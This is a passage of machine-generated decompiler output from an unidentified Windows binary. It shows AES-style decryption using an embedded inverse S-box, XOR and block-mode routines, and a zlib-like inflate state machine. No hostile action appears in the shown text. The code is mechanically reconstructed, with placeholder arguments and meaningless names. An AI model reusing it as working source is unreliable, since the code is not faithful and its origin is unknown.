    int32_t v66 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v65 >> 31) | (int64_t)v65) % v50) + v49); // 0x4039fc
    char v67 = *(char *)((v66 & 255) + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}"); // 0x403a08
    unsigned char result2 = v67 ^ (char)v57; // 0x403a0e
    *(char *)(v55 + 3) = result2;
    v54++;
    while (v54 != v5) {
        // 0x403980
        v53 += 4;
        v55 += 4;
        v56++;
        v57 = *(int32_t *)(v1 + 488 + 4 * (v54 + 8 * *v19));
        v58 = *(char *)(v53 + 3);
        v59 = *(char *)((int32_t)v58 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}");
        *(char *)v55 = v59 ^ (char)(v57 / 0x1000000);
        v60 = v56 + v7 - v8;
        v61 = *(char *)(v51 + 4 * (int32_t)((0x100000000 * (int64_t)(v60 >> 31) | (int64_t)v60) % v50));
        v62 = *(char *)((int32_t)v61 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}");
        *(char *)(v55 + 1) = v62 ^ (char)(v57 / 0x10000);
        v63 = *(char *)(v52 + 4 * (int32_t)((0x100000000 * (int64_t)(v56 >> 31) | (int64_t)v56) % v50));
        v64 = *(char *)((int32_t)v63 + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}");
        *(char *)(v55 + 2) = v64 ^ (char)(v57 / 256);
        v65 = v56 + v9 - v8;
        v66 = *(int32_t *)(4 * (int32_t)((0x100000000 * (int64_t)(v65 >> 31) | (int64_t)v65) % v50) + v49);
        v67 = *(char *)((v66 & 255) + (int32_t)"R\tj\xd5\x30\x36\xa5\x38\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe3\x39\x82\x9b/\xff\x87\x34\x8e\x43\x44\xc4\xde\xe9\xcbT{\x94\x32\xa6\xc2#=\xeeL\x95\vB\xfa\xc3N\b.\xa1\x66(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6\x64\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15\x46W\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3\x45\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11\x41Og\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact\"\xe7\xad\x35\x85\xe2\xf9\x37\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7\x62\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa8\x33\x88\a\xc7\x31\xb1\x12\x10Y'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99\x61\x17+\x04~\xbaw\xd6&\xe1i\x14\x63U!\f}");
        result2 = v67 ^ (char)v57;
        *(char *)(v55 + 3) = result2;
        v54++;
    }
    // 0x403a21
    return result2;
}

// Address range: 0x403a28 - 0x403a77
int32_t function_403a28(int32_t a1, int32_t a2) {
    // 0x403a28
    int32_t v1; // 0x403a28
    if (*(char *)(v1 + 4) == 0) {
        // 0x403a35
        int32_t v2; // bp-16, 0x403a28
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v2);
        _CxxThrowException(&v2, &g17);
        // UNREACHABLE
    }
    int32_t * v3 = (int32_t *)(v1 + 972); // 0x403a53
    int32_t result2 = a1; // 0x403a59
    int32_t v4 = 0; // 0x403a59
    if (*v3 < 1) {
        // 0x403a72
        int32_t result; // 0x403a28
        return result;
    }
    int32_t v5 = a2; // 0x403a59
    char * v6 = (char *)result2; // 0x403a64
    *v6 = *v6 ^ *(char *)v5;
    result2++;
    v4++;
    v5++;
    while (v4 < *v3) {
        // 0x403a62
        v6 = (char *)result2;
        *v6 = *v6 ^ *(char *)v5;
        result2++;
        v4++;
        v5++;
    }
    // 0x403a72
    return result2;
}

// Address range: 0x403a77 - 0x403bd6
int32_t function_403a77(int32_t a1, int32_t a2, uint32_t a3, int32_t a4) {
    // 0x403a77
    int32_t v1; // bp-16, 0x403a77
    int32_t v2; // 0x403a77
    if (*(char *)(v2 + 4) == 0) {
        // 0x403a89
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v1);
        _CxxThrowException(&v1, &g17);
        // UNREACHABLE
    }
    if (a3 == 0) {
        // 0x403bba
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v1);
        _CxxThrowException(&v1, &g17);
        // UNREACHABLE
    }
    int32_t * v3 = (int32_t *)(v2 + 972); // 0x403ab0
    uint32_t v4 = *v3; // 0x403ab0
    uint32_t v5 = a3 % v4;
    if (v5 != 0) {
        // 0x403bba
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v1);
        _CxxThrowException(&v1, &g17);
        // UNREACHABLE
    }
    // 0x403ac2
    int32_t v6; // bp-28, 0x403a77
    int32_t v7 = &v6; // 0x403a83
    if (a4 == 1) {
        // 0x403ac8
        if ((int32_t)((0x100000000 * (int64_t)v5 | (int64_t)a3) / (int64_t)v4) == 0) {
            // 0x403b21
            return 0;
        }
        int32_t v8 = v2 + 1008;
        int32_t v9 = 0; // 0x403b19
        int32_t v10 = a2; // 0x403a77
        int32_t v11 = a1; // 0x403a77
        *(int32_t *)(v7 - 4) = v10;
        *(int32_t *)(v7 - 8) = v11;
        function_403797(v9, (int32_t)&g54);
        *(int32_t *)(v7 - 12) = v8;
        int32_t v12 = v7 - 16; // 0x403aec
        *(int32_t *)v12 = v10;
        function_403a28((int32_t)&g54, (int32_t)&g54);
        *(int32_t *)(v7 - 20) = *v3;
        *(int32_t *)(v7 - 24) = v11;
        *(int32_t *)(v7 - 28) = v8;
        memcpy(&g54, &g54, (int32_t)&g54);
        uint32_t v13 = *v3; // 0x403b05
        uint32_t result = a3 / v13;
        v9++;
        v10 += v13;
        v11 += v13;
        while (v9 < result) {
            int32_t v14 = v12;
            *(int32_t *)(v14 - 4) = v10;
            *(int32_t *)(v14 - 8) = v11;
            function_403797(v9, (int32_t)&g54);
            *(int32_t *)(v14 - 12) = v8;
            v12 = v14 - 16;
            *(int32_t *)v12 = v10;
            function_403a28((int32_t)&g54, (int32_t)&g54);
            *(int32_t *)(v14 - 20) = *v3;
            *(int32_t *)(v14 - 24) = v11;
            *(int32_t *)(v14 - 28) = v8;
            memcpy(&g54, &g54, (int32_t)&g54);
            v13 = *v3;
            result = a3 / v13;
            v9++;
            v10 += v13;
            v11 += v13;
        }
        // 0x403b21
        return result;
    }
    int32_t result2 = a3 / v4;
    if (a4 != 2) {
        int32_t v15 = 0; // 0x403b91
        int32_t v16 = a2; // 0x403b91
        int32_t v17 = v7; // 0x403b91
        if (v4 > a3) {
            // 0x403b21
            return result2;
        }
        int32_t v18 = a1; // 0x403b91
        *(int32_t *)(v17 - 4) = v16;
        v17 -= 8;
        *(int32_t *)v17 = v18;
        function_403797(v15, (int32_t)&g54);
        uint32_t v19 = *v3; // 0x403b9c
        uint32_t result3 = a3 / v19;
        v15++;
        v16 += v19;
        v18 += v19;
        while (v15 < result3) {
            // 0x403b93
            *(int32_t *)(v17 - 4) = v16;
            v17 -= 8;
            *(int32_t *)v17 = v18;
            function_403797(v15, (int32_t)&g54);
            v19 = *v3;
            result3 = a3 / v19;
            v15++;
            v16 += v19;
            v18 += v19;
        }
        // 0x403b21
        return result3;
    }
    // 0x403b3a
    if (v4 > a3) {
        // 0x403b21
        return result2;
    }
    int32_t v20 = v2 + 1008; // 0x403b42
    int32_t v21 = 0; // 0x403b81
    int32_t v22 = a2; // 0x403a77
    int32_t v23 = a1; // 0x403a77
    *(int32_t *)(v7 - 4) = v22;
    *(int32_t *)(v7 - 8) = v20;
    function_40350f(v21, (int32_t)&g54);
    *(int32_t *)(v7 - 12) = v23;
    int32_t v24 = v7 - 16; // 0x403b52
    *(int32_t *)v24 = v22;
    function_403a28((int32_t)&g54, (int32_t)&g54);
    *(int32_t *)(v7 - 20) = *v3;
    *(int32_t *)(v7 - 24) = v23;
    *(int32_t *)(v7 - 28) = v20;
    memcpy(&g54, &g54, (int32_t)&g54);
    uint32_t v25 = *v3; // 0x403b6d
    uint32_t result4 = a3 / v25;
    v21++;
    v22 += v25;
    v23 += v25;
    while (v21 < result4) {
        int32_t v26 = v24;
        *(int32_t *)(v26 - 4) = v22;
        *(int32_t *)(v26 - 8) = v20;
        function_40350f(v21, (int32_t)&g54);
        *(int32_t *)(v26 - 12) = v23;
        v24 = v26 - 16;
        *(int32_t *)v24 = v22;
        function_403a28((int32_t)&g54, (int32_t)&g54);
        *(int32_t *)(v26 - 20) = *v3;
        *(int32_t *)(v26 - 24) = v23;
        *(int32_t *)(v26 - 28) = v20;
        memcpy(&g54, &g54, (int32_t)&g54);
        v25 = *v3;
        result4 = a3 / v25;
        v21++;
        v22 += v25;
        v23 += v25;
    }
    // 0x403b21
    return result4;
}

// Address range: 0x403bd6 - 0x403cc8
int32_t function_403bd6(int32_t a1, int32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 48); // 0x403be3
    uint32_t v2 = *v1; // 0x403be3
    int32_t * v3 = (int32_t *)(a1 + 52); // 0x403be6
    uint32_t v4 = *v3; // 0x403be6
    int32_t * v5 = (int32_t *)(a2 + 12); // 0x403be9
    int32_t v6 = *v5; // 0x403be9
    int32_t v7 = v4; // 0x403bf4
    if (v2 > v4) {
        // 0x403bf6
        v7 = *(int32_t *)(a1 + 44);
    }
    int32_t * v8 = (int32_t *)(a2 + 16); // 0x403bf9
    uint32_t v9 = *v8; // 0x403bf9
    uint32_t v10 = v7 - v2; // 0x403bfc
    int32_t v11 = v10 > v9 ? v9 : v10;
    int32_t * v12 = (int32_t *)(a2 + 20); // 0x403c12
    *v12 = v11 + *v12;
    *v8 = v9 - v11;
    int32_t * v13 = (int32_t *)(a1 + 56); // 0x403c1a
    int32_t v14 = *v13; // 0x403c1a
    if (v14 != 0) {
        // 0x403c21
        *(int32_t *)(a1 + 60) = v14;
        *(int32_t *)(a2 + 48) = v14;
    }
    int32_t v15 = v6; // 0x403c33
    int32_t v16 = v2; // 0x403c33
    if (v11 != 0) {
        // 0x403c35
        memcpy((int32_t *)v6, (int32_t *)v2, v11);
        v15 = v11 + v6;
        v16 = v11 + v2;
    }
    int32_t v17 = a3 != -5 | v11 == 0 ? a3 : 0;
    int32_t v18 = *(int32_t *)(a1 + 44); // 0x403c4a
    int32_t v19 = v15; // 0x403c50
    int32_t v20 = v16; // 0x403c50
    int32_t result = v17; // 0x403c50
    if (v16 == v18) {
        int32_t v21 = *(int32_t *)(a1 + 40); // 0x403c52
        int32_t v22 = *v3; // 0x403c55
        int32_t v23 = v22; // 0x403c5b
        if (v22 == v18) {
            // 0x403c5d
            *v3 = v21;
            v23 = v21;
        }
        uint32_t v24 = *v8; // 0x403c63
        uint32_t v25 = v23 - v21; // 0x403c66
        int32_t v26 = v25 > v24 ? v24 : v25;
        *v12 = v26 + *v12;
        *v8 = v24 - v26;
        int32_t v27 = *v13; // 0x403c84
        if (v27 != 0) {
            // 0x403c8b
            *(int32_t *)(a1 + 60) = v27;
            *(int32_t *)(a2 + 48) = v27;
        }
        // 0x403c9b
        v19 = v15;
        v20 = v21;
        result = v17;
        if (v26 != 0) {
            // 0x403c9f
            int32_t v28; // bp-20, 0x403bd6
            int32_t v29 = &v28; // 0x403bdf
            *(int32_t *)(v29 - 4) = v26;
            *(int32_t *)(v29 - 8) = v21;
            *(int32_t *)(v29 - 12) = v15;
            memcpy((int32_t *)v15, &g54, (int32_t)&g54);
            v19 = v26 + v15;
            v20 = v26 + v21;
            result = v17 != -5 | v26 == 0 ? v17 : 0;
        }
    }
    // 0x403cb4
    *v5 = v19;
    *v1 = v20;
    return result;
}

// Address range: 0x403cc8 - 0x403cfc
int32_t function_403cc8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t result) {
    if (result != 0) {
        // 0x403cdf
        *(int32_t *)result = 0;
        *(char *)(result + 16) = (char)a1;
        *(char *)(result + 17) = (char)a2;
        *(int32_t *)(result + 20) = a3;
        *(int32_t *)(result + 24) = a4;
    }
    // 0x403cfa
    return result;
}

// Address range: 0x403cfc - 0x404287
// Used cryptographic patterns:
//  - unlzx_table_three (32-bit, little endian)
int32_t function_403cfc(int32_t a1, int32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)a2; // 0x403d0b
    int32_t * v2 = (int32_t *)(a2 + 4); // 0x403d10
    int32_t * v3 = (int32_t *)(a1 + 52); // 0x403d13
    uint32_t v4 = *v3; // 0x403d13
    int32_t * v5 = (int32_t *)(a1 + 32); // 0x403d19
    int32_t v6 = *(int32_t *)(a1 + 4); // 0x403d1c
    int32_t * v7 = (int32_t *)(a1 + 28); // 0x403d22
    int32_t * v8 = (int32_t *)(a1 + 48); // 0x403d28
    uint32_t v9 = *v8; // 0x403d28
    int32_t * v10; // 0x403cfc
    int32_t v11; // 0x403cfc
    if (v4 >= v9) {
        int32_t * v12 = (int32_t *)(a1 + 44);
        v10 = v12;
        v11 = *v12 - v4;
    } else {
        // 0x403d2f
        v10 = (int32_t *)(a1 + 44);
        v11 = v9 + -1 - v4;
    }
    // 0x403d39
    int32_t v13; // bp-40, 0x403cfc
    int32_t v14 = &v13; // 0x403d07
    int32_t * v15 = (int32_t *)v6;
    int32_t * v16 = (int32_t *)(a1 + 40);
    int32_t * v17 = (int32_t *)(v14 - 4);
    int32_t * v18 = (int32_t *)(v14 - 8);
    int32_t * v19 = (int32_t *)(v14 - 12);
    int32_t v20 = v6 + 8;
    int32_t * v21 = (int32_t *)v20;
    int32_t * v22 = (int32_t *)(v6 + 12);
    int32_t * v23 = (int32_t *)(v6 + 4);
    char * v24 = (char *)(v6 + 17);
    int32_t * v25 = (int32_t *)(v6 + 24);
    int32_t * v26 = (int32_t *)(a2 + 8);
    int32_t * v27 = (int32_t *)(v6 + 20);
    char * v28 = (char *)(v6 + 16);
    int32_t v29 = *v5; // 0x403d39
    int32_t v30 = *v7; // 0x403d39
    char * v31 = (char *)*v1; // 0x403d39
    int32_t v32 = *v2; // 0x403d39
    int32_t v33 = v11; // 0x403d39
    int32_t v34 = a3; // 0x403d39
    int32_t v35 = v4; // 0x403d39
    int32_t v36; // 0x403cfc
    int32_t result; // 0x403cfc
    int32_t v37; // 0x403cfc
    int32_t v38; // 0x403cfc
    int32_t v39; // 0x403cfc
    int32_t v40; // 0x403cfc
    int32_t v41; // 0x403cfc
    int32_t v42; // 0x403cfc
    int32_t v43; // 0x403cfc
    int32_t v44; // 0x403cfc
    int32_t v45; // 0x403cfc
    int32_t v46; // 0x403cfc
    int32_t v47; // 0x403cfc
    int32_t v48; // 0x403cfc
    int32_t v49; // 0x403cfc
    int32_t v50; // 0x403cfc
    int32_t v51; // 0x403cfc
    int32_t v52; // 0x403cfc
    int32_t v53; // 0x403cfc
    int32_t v54; // 0x403cfc
    int32_t v55; // 0x403cfc
    int32_t v56; // 0x403cfc
    int32_t v57; // 0x403cfc
    int32_t v58; // 0x403cfc
    int32_t v59; // 0x403cfc
    int32_t v60; // 0x403cfc
    int32_t v61; // 0x403cfc
    int32_t v62; // 0x403cfc
    int32_t v63; // 0x403cfc
    int32_t v64; // 0x403cfc
    int32_t v65; // 0x403cfc
    int32_t v66; // 0x403cfc
    int32_t v67; // 0x403cfc
    int32_t v68; // 0x403cfc
    int32_t v69; // 0x403cfc
    int32_t v70; // 0x403cfc
    int32_t v71; // 0x403cfc
    int32_t v72; // 0x403cfc
    int32_t v73; // 0x403cfc
    int32_t v74; // 0x403cfc
    int32_t v75; // 0x403cfc
    char * v76; // 0x403cfc
    char * v77; // 0x403cfc
    char * v78; // 0x403cfc
    char * v79; // 0x403cfc
    char * v80; // 0x403cfc
    char * v81; // 0x403cfc
    char * v82; // 0x403cfc
    char * v83; // 0x403cfc
    int32_t v84; // 0x403cfc
    int32_t v85; // 0x403cfc
    int32_t v86; // 0x403cfc
    while (true) {
      lab_0x403d3c_3:
        // 0x403d3c
        v39 = v35;
        v47 = v34;
        v73 = v33;
        v66 = v32;
        v76 = v31;
        v53 = v30;
        v60 = v29;
        int32_t v87 = *v15; // 0x403d3c
        g53 = v87;
        v64 = v60;
        v57 = v53;
        v81 = v76;
        v70 = v66;
        v75 = v73;
        v50 = v47;
        v45 = v39;
        v65 = v60;
        v58 = v53;
        v82 = v76;
        v71 = v66;
        v51 = v47;
        v62 = v60;
        v54 = v53;
        v77 = v76;
        v67 = v66;
        v41 = v39;
        v55 = v53;
        v79 = v76;
        v68 = v66;
        v43 = v39;
        switch (v87) {
            case 0: {
                // 0x403d4e
                v63 = v60;
                v56 = v53;
                v80 = v76;
                v69 = v66;
                v74 = v73;
                v49 = v47;
                v44 = v39;
                if (v66 < 10 || v73 < 258) {
                    goto lab_0x403dea;
                } else {
                    // 0x403d63
                    *v17 = a2;
                    *v5 = v60;
                    *v7 = v53;
                    *v2 = v66;
                    int32_t v88 = (int32_t)v76; // 0x403d76
                    *v18 = a1;
                    *v1 = v88;
                    *v26 = v88 - *v1 + *v26;
                    *v3 = v39;
                    *v19 = *v25;
                    *(int32_t *)(v14 - 16) = *v27;
                    *(int32_t *)(v14 - 20) = (int32_t)*v24;
                    *(int32_t *)(v14 - 24) = (int32_t)*v28;
                    int32_t v89 = function_40514d((int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54, (int32_t)&g54); // 0x403d96
                    int32_t v90 = *v2; // 0x403da3
                    int32_t v91 = *v3; // 0x403da6
                    int32_t v92 = *v5; // 0x403dac
                    int32_t v93 = *v7; // 0x403db5
                    uint32_t v94 = *v8; // 0x403dbb
                    if (v91 >= v94) {
                        // branch -> 0x403dcc
                    }
                    char * v95 = (char *)*v1; // 0x403da0
                    int32_t v96 = v94 + -1 - v91;
                    v63 = v92;
                    v56 = v93;
                    v80 = v95;
                    v69 = v90;
                    v74 = v96;
                    v49 = 0;
                    v44 = v91;
                    if (v89 == 0) {
                        goto lab_0x403dea;
                    } else {
                        // 0x403dd5
                        *v15 = v89 == 1 ? 7 : 9;
                        v29 = v92;
                        v30 = v93;
                        v31 = v95;
                        v32 = v90;
                        v33 = v96;
                        v34 = v89;
                        v35 = v91;
                        goto lab_0x403d3c_3;
                    }
                }
            }
            case 1: {
                goto lab_0x403dfd;
            }
            case 2: {
                uint32_t v97 = *v21; // 0x403e9c
                int32_t v98 = v60; // 0x403ea2
                int32_t v99 = v53; // 0x403ea2
                char * v100 = v76; // 0x403ea2
                int32_t v101 = v66; // 0x403ea2
                int32_t v102 = v47; // 0x403ea2
                if (v53 < v97) {
                    int32_t v103 = v60; // 0x403ea8
                    int32_t v104 = v53; // 0x403ea8
                    char * v105 = v76; // 0x403ea8
                    int32_t v106 = v66; // 0x403ea8
                    v86 = v60;
                    v85 = v53;
                    v84 = 0;
                    v78 = v76;
                    v48 = v47;
                    v42 = v39;
                    if (v66 == 0) {
                        goto lab_0x4041c7_10;
                    }
                    v106--;
                    v103 |= (int32_t)*v105 << (v104 & 31);
                    v105 = (char *)((int32_t)v105 + 1);
                    v104 += 8;
                    v98 = v103;
                    v99 = v104;
                    v100 = v105;
                    v101 = v106;
                    v102 = 0;
                    while (v104 < v97) {
                        // 0x403ea4
                        v86 = v103;
                        v85 = v104;
                        v84 = 0;
                        v78 = v105;
                        v48 = 0;
                        v42 = v39;
                        if (v106 == 0) {
                            goto lab_0x4041c7_10;
                        }
                        v106--;
                        v103 |= (int32_t)*v105 << (v104 & 31);
                        v105 = (char *)((int32_t)v105 + 1);
                        v104 += 8;
                        v98 = v103;
                        v99 = v104;
                        v100 = v105;
                        v101 = v106;
                        v102 = 0;
                    }
                }
                int32_t v107 = *(int32_t *)(4 * v97 + (int32_t)&unlzx_table_three_at_40bca8); // 0x403ecc
                *v15 = 3;
                *v23 = *v23 + (v107 & v98);
                *v22 = (int32_t)*v24;
                *v21 = *v25;
                v65 = v98 >> (v97 & 31);
                v58 = v99 - v97;
                v82 = v100;
                v71 = v101;
                v51 = v102;
                goto lab_0x403ef7;
            }
            case 3: {
                goto lab_0x403ef7;
            }
            case 4: {
                uint32_t v108 = *v21; // 0x403f82
                int32_t v109 = v60; // 0x403f88
                int32_t v110 = v53; // 0x403f88
                char * v111 = v76; // 0x403f88
                int32_t v112 = v66; // 0x403f88
                int32_t v113 = v47; // 0x403f88
                if (v53 < v108) {
                    int32_t v114 = v60; // 0x403f8e
                    int32_t v115 = v53; // 0x403f8e
                    char * v116 = v76; // 0x403f8e
                    int32_t v117 = v66; // 0x403f8e
                    v86 = v60;
                    v85 = v53;
                    v84 = 0;
                    v78 = v76;
                    v48 = v47;
                    v42 = v39;
                    if (v66 == 0) {
                        goto lab_0x4041c7_10;
                    }
                    v117--;
                    v114 |= (int32_t)*v116 << (v115 & 31);
                    v116 = (char *)((int32_t)v116 + 1);
                    v115 += 8;
                    v109 = v114;
                    v110 = v115;
                    v111 = v116;
                    v112 = v117;
                    v113 = 0;
                    while (v115 < v108) {
                        // 0x403f8a
                        v86 = v114;
                        v85 = v115;
                        v84 = 0;
                        v78 = v116;
                        v48 = 0;
                        v42 = v39;
                        if (v117 == 0) {
                            goto lab_0x4041c7_10;
                        }
                        v117--;
                        v114 |= (int32_t)*v116 << (v115 & 31);
                        v116 = (char *)((int32_t)v116 + 1);
                        v115 += 8;
                        v109 = v114;
                        v110 = v115;
                        v111 = v116;
                        v112 = v117;
                        v113 = 0;
                    }
                }
                int32_t v118 = *(int32_t *)(4 * v108 + (int32_t)&unlzx_table_three_at_40bca8); // 0x403fb2
                *v15 = 5;
                int32_t v119 = *v22 + (v118 & v109); // 0x403fc8
                *v22 = v119;
                v36 = v119;
                v61 = v109 >> (v108 & 31);
                v59 = v110 - v108;
                v83 = v111;
                v72 = v112;
                v52 = v113;
                goto lab_0x403fd0;
            }
            case 5: {
                // 0x403d3c
                v36 = *v22;
                v61 = v60;
                v59 = v53;
                v83 = v76;
                v72 = v66;
                v52 = v47;
                goto lab_0x403fd0;
            }
            case 6: {
                // 0x4040bf
                v38 = v73;
                v40 = v39;
                if (v73 != 0) {
                    goto lab_0x404149;
                } else {
                    int32_t v120 = *v10; // 0x4040c7
                    v37 = v120;
                    v46 = v39;
                    if (v39 != v120) {
                        goto lab_0x4040ef;
                    } else {
                        uint32_t v121 = *v8; // 0x4040d1
                        int32_t v122 = *v16; // 0x4040d4
                        v37 = v121;
                        v46 = v39;
                        if (v121 == v122) {
                            goto lab_0x4040ef;
                        } else {
                            int32_t v123 = v122 >= v121 ? v120 - v122 : v121 + -1 - v122;
                            v37 = v123;
                            v46 = v122;
                            v38 = v123;
                            v40 = v122;
                            if (v123 != 0) {
                                goto lab_0x404149;
                            } else {
                                goto lab_0x4040ef;
                            }
                        }
                    }
                }
            }
            case 7: {
                int32_t v124 = v53; // 0x4041e2
                char * v125 = v76; // 0x4041e2
                int32_t v126 = v66; // 0x4041e2
                if (v53 >= 8) {
                    // 0x4041e4
                    v124 = v53 - 8;
                    v125 = (char *)((int32_t)v76 - 1);
                    v126 = v66 + 1;
                }
                // 0x4041ee
                *v17 = v47;
                *v3 = v39;
                *v18 = a2;
                *v19 = a1;
                int32_t v127 = *v3; // 0x4041fb
                if (*v8 != v127) {
                    // 0x404206
                    *v17 = v73;
                    *v5 = v60;
                    *v7 = v124;
                    *v2 = v126;
                    int32_t v128 = (int32_t)v125; // 0x404219
                    *v1 = v128;
                    *v26 = v128 - *v1 + *v26;
                    *v3 = v127;
                    result = v73;
                  lab_0x404278:
                    // 0x404278
                    *v18 = a2;
                    *v19 = a1;
                    return result;
                }
                // 0x40422a
                *v15 = 8;
                v55 = v124;
                v79 = v125;
                v68 = v126;
                v43 = v127;
                goto lab_0x404230;
            }
            case 8: {
                goto lab_0x404230;
            }
            case 9: {
                goto lab_0x40417e;
            }
            default: {
                goto lab_0x404255;
            }
        }
    }
  lab_0x404255:
    // 0x404255
    *v17 = -2;
    *v5 = v60;
